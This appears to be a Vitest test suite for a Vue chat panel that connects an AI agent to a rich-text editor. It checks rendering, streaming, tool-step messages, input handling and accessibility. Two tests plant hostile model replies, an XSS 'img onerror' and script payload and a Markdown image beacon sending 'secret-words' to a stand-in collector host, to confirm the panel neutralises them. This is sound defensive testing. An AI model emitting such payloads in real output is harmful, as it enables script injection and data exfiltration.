import type { Model, ModelChunk, ModelRequest, ScriptStep } from '@hakulex/agent-core'
import type { AgentController } from '@hakulex/plugin-agent'
import type { LexicalEditor, SerializedEditorState } from 'lexical'
import { readFileSync } from 'node:fs'
import { join } from 'node:path'
import { scriptedModel } from '@hakulex/agent-core'
import { RichEditor } from '@hakulex/editor'
import { AgentPlugin, useAgent } from '@hakulex/plugin-agent'
import { flushPromises, mount } from '@vue/test-utils'
import { $createRangeSelection, $getRoot, $isElementNode, $setSelection } from 'lexical'
import { afterEach, describe, expect, it } from 'vitest'
import { h } from 'vue'
import AgentChat from '../src/chat/AgentChat.vue'

type Json = Record<string, any>

afterEach(() => {
  document.body.innerHTML = ''
})

function text(value: string): Json {
  return {
    type: 'text',
    text: value,
    format: 0,
    detail: 0,
    mode: 'normal',
    style: '',
    version: 1,
  }
}
function paragraph(value: string): Json {
  return {
    type: 'paragraph',
    children: [
      text(value),
    ],
    direction: null,
    format: '',
    indent: 0,
    version: 1,
    textFormat: 0,
    textStyle: '',
  }
}
function three() {
  return ({
    root: {
      type: 'root',
      children: [
        paragraph('第一段的文字'),
        paragraph('第二段的文字'),
        paragraph('第三段的文字'),
      ],
      direction: null,
      format: '',
      indent: 0,
      version: 1,
    },
  }) as unknown as SerializedEditorState
}

const blockIds = (editor: LexicalEditor) => (editor.getEditorState().toJSON().root.children as Json[]).map(block => block.$?.blockId as string)

/** A model whose reply is fed by hand, to look at the panel while it is still coming. */
function handFed() {
  const requests: ModelRequest[] = []
  let push: (chunk: ModelChunk | null) => void = () => {}
  const model: Model = async function* (request) {
    requests.push(request)
    const queue: (ModelChunk | null)[] = []
    let wake: (() => void) | null = null
    push = (chunk) => {
      queue.push(chunk)
      wake?.()
    }
    while (true) {
      while (queue.length === 0) {
        await new Promise<void>((resolve) => {
          wake = resolve
          request.signal.addEventListener('abort', () => resolve(), { once: true })
        })
        if (request.signal.aborted)
          return
      }
      const chunk = queue.shift()!
      if (chunk === null)
        return
      yield chunk
    }
  }
  return {
    model,
    requests,
    feed: async (...chunks: (ModelChunk | null)[]) => {
      for (const chunk of chunks)
        push(chunk)
      await flushPromises()
    },
  }
}

interface Options {
  model?: Model
  script?: (ids: string[]) => ScriptStep[][]
  editor?: boolean
  props?: Json
  maxRounds?: number
}

async function setup(options: Options = {}) {
  const play = { model: options.model ?? scriptedModel([]) }
  const requests: ModelRequest[] = []
  const agent: AgentController = useAgent({
    maxRounds: options.maxRounds,
    model: (request) => {
      requests.push(request)
      return play.model(request)
    },
  })
  let editor: LexicalEditor | undefined
  if (options.editor !== false) {
    const host = mount(RichEditor, {
      props: {
        modelValue: three(),
      } as never,
      attachTo: document.body,
      slots: {
        default: () => h(AgentPlugin, { agent, bar: false }),
      },
    })
    editor = (host.vm as unknown as { editor: LexicalEditor }).editor
    await flushPromises()
    if (options.script)
      play.model = scriptedModel(options.script(blockIds(editor)))
  }
  const wrapper = mount(AgentChat, {
    props: { agent, ...options.props },
    attachTo: document.body,
  })
  await flushPromises()
  return { agent, editor, wrapper, requests }
}

const chat = () => document.querySelector<HTMLElement>('.hlx-chat')!
const list = () => chat().querySelector<HTMLElement>('.hlx-chat-list')!
function messages() {
  return [
    ...chat().querySelectorAll<HTMLElement>('.hlx-chat-message'),
  ]
}
const input = () => chat().querySelector<HTMLTextAreaElement>('textarea')!
function named(name: string) {
  return [
    ...chat().querySelectorAll<HTMLButtonElement>('button'),
  ].find(button =>
    button.getAttribute('aria-label') === name || button.textContent?.trim() === name)
}
function lastUserText(request: ModelRequest) {
  const last = request.messages.findLast(message => message.role === 'user')
  return last?.role === 'user'
    ? last.text
    : ''
}

async function write(value: string) {
  input().value = value
  input().dispatchEvent(new Event('input', { bubbles: true }))
  await flushPromises()
}
async function key(init: KeyboardEventInit) {
  const event = new KeyboardEvent('keydown', { bubbles: true, cancelable: true, ...init })
  input().dispatchEvent(event)
  await flushPromises()
  return event
}
async function say(value: string) {
  await write(value)
  await key({ key: 'Enter' })
}
async function press(button: HTMLElement | undefined) {
  expect(button, 'the button is there').toBeTruthy()
  button!.click()
  await flushPromises()
}

describe('the conversation', () => {
  it('shows who said what in order, with the reply as Markdown and HTML left as text', async () => {
    await setup({
      script: () => [
        [
          { text: '改好了，有**兩件事**：\n\n- 第一件\n- 第二件 `code`\n\n<img src=x onerror="window.__hit = 1"> <script>window.__hit = 2</script>' },
        ],
      ],
    })
    await say('幫我看一下')

    expect(messages().map(message => message.dataset.role)).toEqual(['user', 'assistant'])
    expect(messages()[0].textContent).toContain('幫我看一下')
    const reply = messages()[1]
    expect(reply.querySelector('strong')!.textContent).toBe('兩件事')
    expect([
      ...reply.querySelectorAll('li'),
    ].map(item => item.textContent?.trim())).toEqual(['第一件', '第二件 code'])
    expect(reply.querySelector('code')!.textContent).toBe('code')
    // What the model wrote as HTML is there to read, and is no element of the page.
    expect(reply.querySelector('img, script')).toBeNull()
    expect(reply.textContent).toContain('<img src=x')
    expect((window as unknown as Json).__hit).toBeUndefined()
  })

  it('never loads a picture the model asks for: only its description is shown', async () => {
    await setup({
      script: () => [
        [
          { text: '看這張圖：![文件的摘要](https://collector.example/pixel?d=secret-words) 還有一個[連結](https://example.com/page)。' },
        ],
      ],
    })
    await say('改')

    const reply = messages()[1]
    expect(reply.querySelector('img')).toBeNull()
    expect(reply.innerHTML).not.toContain('collector.example')
    expect(reply.textContent).toContain('文件的摘要')
    // A link is still a link: it goes nowhere until it is pressed.
    const link = reply.querySelector('a')!
    expect(link.getAttribute('href')).toBe('https://example.com/page')
    expect(link.getAttribute('rel')).toContain('noopener')
    expect(link.getAttribute('target')).toBe('_blank')
  })

  it('grows with the reply as it comes, and says so while there is nothing yet', async () => {
    const fed = handFed()
    await setup({ model: fed.model })
    await say('改')

    expect(messages().map(message => message.dataset.role)).toEqual(['user', 'assistant'])
    expect(messages()[1].textContent).toContain('思考中')
    await fed.feed({ type: 'text', text: '第一段' })
    expect(messages()[1].textContent).toContain('第一段')
    expect(messages()[1].textContent).not.toContain('思考中')
    await fed.feed({ type: 'text', text: '，第二段' })
    expect(messages()[1].textContent).toContain('第一段，第二段')
    await fed.feed({ type: 'done' })
    expect(messages()[1].dataset.running).toBeUndefined()
  })

  it('keeps the thinking folded until asked for', async () => {
    await setup({
      script: () => [
        [
          { thinking: '先看第二段在講什麼' },
          { text: '好了。' },
        ],
        [
          { text: '沒有思考的回覆' },
        ],
      ],
    })
    await say('第一次')
    await say('第二次')

    const [, first, , second] = messages()
    const toggle = first.querySelector<HTMLButtonElement>('button.hlx-chat-thinking-toggle')!
    expect(toggle.textContent).toContain('思考過程')
    expect(toggle.getAttribute('aria-expanded')).toBe('false')
    expect(first.textContent).not.toContain('先看第二段在講什麼')

    await press(toggle)
    expect(toggle.getAttribute('aria-expanded')).toBe('true')
    expect(first.textContent).toContain('先看第二段在講什麼')
    await press(toggle)
    expect(first.textContent).not.toContain('先看第二段在講什麼')

    expect(second.querySelector('.hlx-chat-thinking-toggle')).toBeNull()
  })

  it('says in plain words what the tools did, and never shows their arguments', async () => {
    const fed = handFed()
    const { editor } = await setup({ model: fed.model })
    const [a, b, c] = blockIds(editor!)
    await say('改')

    await fed.feed({ type: 'tool_call_start', id: 't1', name: 'replace_block' })
    const steps = () => [
      ...messages()[1].querySelectorAll<HTMLElement>('.hlx-chat-step'),
    ]
    expect(steps()).toHaveLength(1)
    expect(steps()[0].dataset.state).toBe('running')
    expect(steps()[0].textContent).toContain('正在修改')

    await fed.feed(
      {
        type: 'tool_call',
        id: 't1',
        name: 'replace_block',
        input: JSON.stringify({ blockId: a, xml: '<p>新的第一段</p>' }),
      },
      {
        type: 'tool_call',
        id: 't2',
        name: 'insert_blocks',
        input: JSON.stringify({ position: 'end', xml: '<p>甲</p><p>乙</p>' }),
      },
      {
        type: 'tool_call',
        id: 't3',
        name: 'delete_block',
        input: JSON.stringify({ blockId: c }),
      },
      {
        type: 'tool_call',
        id: 't4',
        name: 'replace_block',
        input: JSON.stringify({ blockId: 'nope', xml: '<p>x</p>' }),
      },
      { type: 'done' },
    )
    expect(steps().map(step => `${step.dataset.state}:${step.textContent?.trim()}`)).toEqual([
      'done:修改了一個區塊',
      'done:新增了 2 個區塊',
      'done:刪除了一個區塊',
      'failed:修改區塊沒有成功',
    ])
    const shown = chat().textContent ?? ''
    for (const hidden of [
      a,
      b,
      c,
      'nope',
      '<p>',
      'blockId',
      'xml',
      'replace_block',
    ])
      expect(shown).not.toContain(hidden)
    // The second round, still to come: the reply after the tools.
    await fed.feed({ type: 'text', text: '都處理了。' }, { type: 'done' })
    expect(messages().at(-1)!.textContent).toContain('都處理了。')
  })

  it('says why a reply stopped short, and can try again after an error', async () => {
    const fed = handFed()
    const { agent } = await setup({ model: fed.model, maxRounds: 1 })

    await say('第一次')
    await fed.feed({ type: 'text', text: '寫到一半' })
    await press(named('中止'))
    expect(messages()[1].textContent).toContain('寫到一半')
    expect(messages()[1].textContent).toContain('已中止')

    await say('第二次')
    await fed.feed({
      type: 'tool_call',
      id: 't1',
      name: 'delete_block',
      input: '{"blockId":"nope"}',
    }, { type: 'done' })
    expect(messages()[3].textContent).toContain('上限')

    let fails = true
    const failing: Model = async function* () {
      yield { type: 'text', text: '開頭' }
      if (fails)
        throw new Error('503 服務忙碌')
      yield { type: 'text', text: '，這次成功。' }
    }
    document.body.innerHTML = ''
    const second = await setup({ model: failing })
    await say('會失敗')
    expect(second.agent.state.value.status).toBe('error')
    const failed = messages().at(-1)!
    expect(failed.textContent).toContain('503 服務忙碌')
    fails = false
    await press(named('重試'))
    expect(second.agent.state.value.status).toBe('idle')
    expect(messages()).toHaveLength(2)
    expect(messages()[1].textContent).toContain('開頭，這次成功。')
    expect(chat().textContent).not.toContain('503')
    expect(agent.state.value.status).toBe('idle')
  })

  it('follows the newest words unless the reader has scrolled up, and offers the way back', async () => {
    const fed = handFed()
    await setup({ model: fed.model })
    const box = list()
    // The test page has no layout: give the list one to scroll in.
    let height = 1000
    Object.defineProperty(box, 'scrollHeight', {
      get: () => height,
    })
    Object.defineProperty(box, 'clientHeight', {
      get: () => 200,
    })

    await say('改')
    await fed.feed({ type: 'text', text: '第一段' })
    expect(box.scrollTop).toBe(1000)
    expect(named('跳到最新')).toBeUndefined()

    height = 1400
    await fed.feed({ type: 'text', text: '第二段' })
    expect(box.scrollTop).toBe(1400)

    // The reader goes back up to read.
    box.scrollTop = 300
    box.dispatchEvent(new Event('scroll'))
    await flushPromises()
    height = 1800
    await fed.feed({ type: 'text', text: '第三段' })
    expect(box.scrollTop).toBe(300)
    expect(named('跳到最新')).toBeTruthy()

    await press(named('跳到最新'))
    expect(box.scrollTop).toBe(1800)
    expect(named('跳到最新')).toBeUndefined()
    await fed.feed({ type: 'done' })
  })
})

describe('the input', () => {
  it('sends on Enter and clears, breaks the line on Shift+Enter, and sends nothing empty', async () => {
    const { requests } = await setup({
      script: () => [
        [
          { text: '收到。' },
        ],
        [
          { text: '又收到。' },
        ],
      ],
    })

    await write('   ')
    await key({ key: 'Enter' })
    expect(requests).toHaveLength(0)
    expect(named('送出')!.disabled).toBe(true)

    await write('第一行')
    const shifted = await key({ key: 'Enter', shiftKey: true })
    expect(shifted.defaultPrevented).toBe(false)
    expect(requests).toHaveLength(0)

    await write('  第一行\n第二行  ')
    const sent = await key({ key: 'Enter' })
    expect(sent.defaultPrevented).toBe(true)
    expect(requests).toHaveLength(1)
    expect(lastUserText(requests[0])).toContain('第一行\n第二行')
    expect(input().value).toBe('')
    expect(messages()[0].textContent).toContain('第一行')

    await write('用按鈕送出')
    await press(named('送出'))
    expect(requests).toHaveLength(2)
  })

  it('turns the send button into stop while a reply is coming, and holds Enter back', async () => {
    const fed = handFed()
    const { agent } = await setup({ model: fed.model })
    await say('改')
    await fed.feed({ type: 'text', text: '開頭' })

    expect(named('送出')).toBeUndefined()
    expect(named('中止')).toBeTruthy()
    expect(input().disabled).toBe(false)
    await write('下一句先打好')
    await key({ key: 'Enter' })
    expect(fed.requests).toHaveLength(1)
    expect(input().value).toBe('下一句先打好')

    await press(named('中止'))
    expect(agent.state.value.status).toBe('idle')
    expect(named('送出')).toBeTruthy()
    expect(named('中止')).toBeUndefined()
  })

  it('does not send on the Enter that picks a word in an input method', async () => {
    const { requests } = await setup({
      script: () => [
        [
          { text: '收到。' },
        ],
      ],
    })
    await write('ㄋㄧˇ')

    input().dispatchEvent(new CompositionEvent('compositionstart', { bubbles: true }))
    await key({ key: 'Enter', isComposing: true })
    await key({ key: 'Enter', keyCode: 229 })
    await key({ key: 'Enter' })
    expect(requests).toHaveLength(0)

    input().dispatchEvent(new CompositionEvent('compositionend', { bubbles: true, data: '你' }))
    await write('你')
    await key({ key: 'Enter' })
    expect(requests).toHaveLength(1)
    expect(lastUserText(requests[0])).toContain('你')
  })

  it('can\'t be used before the agent is in an editor, and says why', async () => {
    const { requests } = await setup({
      editor: false,
      props: {
        suggestions: ['改得正式一點'],
      },
    })
    expect(input().disabled).toBe(true)
    expect(named('送出')!.disabled).toBe(true)
    expect(chat().textContent).toContain('還沒有接上編輯器')
    for (const button of chat().querySelectorAll<HTMLButtonElement>('.hlx-chat-suggestion'))
      expect(button.disabled).toBe(true)
    expect(requests).toHaveLength(0)
  })

  function select(editor: LexicalEditor, from: [number, number], to: [number, number]) {
    editor.update(() => {
      const leaf = (index: number) => {
        const block = $getRoot().getChildAtIndex(index)
        return $isElementNode(block)
          ? block.getFirstDescendant()!
          : block!
      }
      const selection = $createRangeSelection()
      selection.anchor.set(leaf(from[0]).getKey(), from[1], 'text')
      selection.focus.set(leaf(to[0]).getKey(), to[1], 'text')
      $setSelection(selection)
    }, { discrete: true })
    document.dispatchEvent(new Event('selectionchange'))
  }
  const chip = () => chat().querySelector<HTMLElement>('.hlx-chat-selection')

  it('takes the editor\'s selection along, and keeps it when the input is focused', async () => {
    const { editor, requests } = await setup({
      script: () => [
        [
          { text: '看到了。' },
        ],
        [
          { text: '好。' },
        ],
        [
          { text: '好。' },
        ],
      ],
    })
    const [a] = blockIds(editor!)
    expect(chip()).toBeNull()

    select(editor!, [0, 1], [0, 4])
    await flushPromises()
    expect(chip()!.textContent).toContain('一段的')

    // Going to the input takes the caret out of the editor; what was selected stays picked.
    input().focus()
    editor!.update(() => $setSelection(null), { discrete: true })
    document.dispatchEvent(new Event('selectionchange'))
    await flushPromises()
    expect(chip()!.textContent).toContain('一段的')

    await say('改這裡')
    expect(lastUserText(requests[0])).toMatch(new RegExp(`<selection block="${a}">一段的</selection>`))
    expect(chip()).toBeNull()

    // Two blocks.
    input().blur()
    select(editor!, [0, 2], [1, 2])
    await flushPromises()
    expect(chip()!.textContent).toContain('已選取 2 個區塊')
    await say('改這兩段')
    expect(lastUserText(requests[1])).toContain('selected="true"')

    // Taken off before sending.
    input().blur()
    select(editor!, [2, 0], [2, 3])
    await flushPromises()
    expect(chip()).not.toBeNull()
    await press(named('移除選取'))
    expect(chip()).toBeNull()
    await say('不帶選取')
    expect(lastUserText(requests[2])).not.toContain('<selection')
    expect(lastUserText(requests[2])).not.toContain('selected="true"')
  })

  it('offers things to ask while there is nothing said yet', async () => {
    const { requests } = await setup({
      script: () => [
        [
          { text: '好的。' },
        ],
      ],
      props: {
        suggestions: ['改得正式一點', '加一段結語'],
        placeholder: '想改什麼？',
      },
    })
    expect(input().placeholder).toBe('想改什麼？')
    const offered = [
      ...chat().querySelectorAll<HTMLButtonElement>('.hlx-chat-suggestion'),
    ]
    expect(offered.map(button => button.textContent?.trim())).toEqual(['改得正式一點', '加一段結語'])

    await press(offered[1])
    expect(lastUserText(requests[0])).toContain('加一段結語')
    expect(chat().querySelectorAll('.hlx-chat-suggestion')).toHaveLength(0)

    document.body.innerHTML = ''
    await setup()
    expect(chat().querySelectorAll('.hlx-chat-suggestion')).toHaveLength(0)
    expect(chat().querySelector('.hlx-chat-empty')!.textContent!.trim().length).toBeGreaterThan(5)
    expect(input().placeholder).toBe('輸入訊息')
  })
})

describe('using it', () => {
  it('is a log that announces replies, with a named input and named buttons', async () => {
    await setup({
      script: () => [
        [
          { thinking: '想一下' },
          { text: '好了。' },
        ],
      ],
    })
    await say('改')

    expect(list().getAttribute('role')).toBe('log')
    expect(list().getAttribute('aria-live')).toBe('polite')
    expect(list().getAttribute('aria-label')).toBeTruthy()
    expect(input().getAttribute('aria-label')).toBeTruthy()
    for (const button of chat().querySelectorAll<HTMLButtonElement>('button')) {
      expect(button.type).toBe('button')
      expect((button.getAttribute('aria-label') ?? button.textContent ?? '').trim().length).toBeGreaterThan(1)
    }
    expect(named('送出')).toBeTruthy()
  })

  it('takes an agent, a placeholder, suggestions and a color scheme, and nothing about models or keys', async () => {
    const props = Object.keys((AgentChat as unknown as { props: object }).props)
    expect(props.sort()).toEqual([
      'agent',
      'colorScheme',
      'placeholder',
      'suggestions',
    ])

    // It carries the design tokens itself, so it needs no editor around it.
    await setup({ editor: false })
    expect(chat().classList.contains('hlx-root')).toBe(true)
    expect(chat().dataset.colorScheme).toBe('light')
    document.body.innerHTML = ''
    await setup({
      editor: false,
      props: { colorScheme: 'dark' },
    })
    expect(chat().dataset.colorScheme).toBe('dark')
  })

  it('has its styles in one file of its own, in the editor\'s tokens', () => {
    const here = join(import.meta.dirname, '../src')
    const css = readFileSync(join(here, 'styles.css'), 'utf8')
    const manifest = JSON.parse(readFileSync(join(here, '../package.json'), 'utf8'))
    expect(manifest.exports['./style.css']).toBe('./src/styles.css')

    const classes = [
      ...css.matchAll(/\.([a-z][\w-]*)/gi),
    ].map(match => match[1])
    expect(classes.length).toBeGreaterThan(10)
    expect(classes.filter(name => !name.startsWith('hlx-'))).toEqual([])
    expect(css).toContain('.hlx-chat-list')
    expect(css).toMatch(/var\(--hlx-color-/)
    expect(css).not.toMatch(/#[0-9a-f]{3,8}\b/i)
    expect(css).not.toMatch(/\brgba?\(/i)
    // The panel fills what it is given, and only the list scrolls.
    expect(css).toMatch(/\.hlx-chat\s*\{[^}]*height:\s*100%/)
    expect(css).toMatch(/\.hlx-chat-list\s*\{[^}]*overflow-y:\s*auto/)

    const source = readFileSync(join(here, 'chat/AgentChat.vue'), 'utf8')
    expect(source).not.toMatch(/import\s+['"][^'"]+\.css['"]/)
    expect(source).not.toContain('<style')
  })
})
